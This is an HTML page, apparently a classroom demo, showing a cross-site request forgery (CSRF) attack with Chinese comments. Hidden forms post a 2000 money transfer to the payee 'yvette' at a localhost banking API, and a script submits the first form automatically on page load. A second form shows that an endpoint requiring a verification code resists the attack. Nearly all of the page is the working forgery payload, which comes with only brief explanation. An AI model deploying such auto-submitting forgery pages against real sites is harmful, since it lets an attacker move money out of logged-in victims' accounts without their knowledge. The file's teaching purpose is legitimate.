<!DOCTYPE html>
<html lang="en">
  <head>

  <body>
    <!-- 偷偷转走你的钱： 3001端口的cookie被自动带去了3001的服务器 -->
    <!-- 表单没有跨域问题 -->
    <form
      name="sneak"
      action="http://localhost:3001/api/transfer"
      method="post"
    >
      <input type="text" name="payee" value="yvette" />
      <input type="text" name="amount" value="2000" />
    </form>

    <!-- 有验证码的接口 -->
    <!-- 虽然用户已经登录，但是需要验证码，验证码匹配错误，不能转走钱 -->
    <form
      name="sneak1"
      action="http://localhost:3001/api/transfer1"
      method="post"
    >
      <input type="text" name="payee" value="yvette" />
      <input type="text" name="amount" value="2000" />
    </form>
  </body>
  <script src="/node_modules/jquery/dist/jquery.js"></script>
  <script>
    window.onload = function () {
      /**
       * uncomment one case every time
       */
      document.sneak.submit(); //cannot prevent CSRF attack
      // document.sneak1.submit();   //with verification code
    };
  </script>
